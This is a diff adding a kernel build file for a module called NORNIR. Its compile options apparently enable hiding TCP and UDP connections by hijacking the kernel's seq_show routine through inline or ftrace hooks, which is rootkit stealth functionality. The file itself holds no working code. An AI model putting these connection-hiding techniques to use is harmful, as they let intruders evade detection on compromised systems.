@@ -1,0 +1,19 @@
+# SPDX-License-Identifier: GPL-2.0
+
+$(MODULE_NAME)-y                                            += net/hide.o
+
+# tcp config
+$(MODULE_NAME)-$(CONFIG_NORNIR_HIDE_TCP_CONN)               += net/tcp.o
+ccflags-$(CONFIG_NORNIR_HIDE_CONN)                          += -DCONFIG_NORNIR_HIDE_CONN
+ccflags-$(CONFIG_NORNIR_HIDE_TCP_CONN)                      += -DCONFIG_NORNIR_HIDE_TCP_CONN
+ccflags-$(CONFIG_NORNIR_HIDE_TCP4_CONN)                     += -DCONFIG_NORNIR_HIDE_TCP4_CONN
+
+# udp config
+$(MODULE_NAME)-$(CONFIG_NORNIR_HIDE_UDP_CONN)               += net/udp.o
+ccflags-$(CONFIG_NORNIR_HIDE_UDP_CONN)                      += -DCONFIG_NORNIR_HIDE_UDP_CONN
+ccflags-$(CONFIG_NORNIR_HIDE_UDP4_CONN)                     += -DCONFIG_NORNIR_HIDE_UDP4_CONN
+
+# hook point
+ccflags-$(CONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW)          += -DCONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW
+ccflags-$(CONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW_INLINE)   += -DCONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW_INLINE
+ccflags-$(CONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW_FTRACE)   += -DCONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW_FTRACE
